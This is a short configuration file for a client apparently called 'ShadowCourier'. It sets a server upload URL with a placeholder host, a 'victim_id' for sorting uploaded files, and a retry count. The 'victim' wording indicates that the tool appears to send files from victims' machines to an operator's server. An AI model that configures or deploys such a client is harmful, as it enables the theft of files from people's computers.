# ShadowCourier Client Configuration
# This file configures the client to connect to the server.
# Edit the values below to match your setup.

[client]
# URL: The server's address and endpoint (e.g., http://your-server-ip:8080/upload).
# Replace 'your-server-ip' with the actual IP or hostname of your server.

url = http://your-server-ip:8080/upload

# Victim ID: A unique identifier for organizing uploaded files on the server.
# Use a descriptive name (e.g., 'test_machine') or leave as 'default_victim'.

victim_id = default_victim

# Retries: Number of retry attempts if the server is unreachable (1-5 recommended).

retries = 3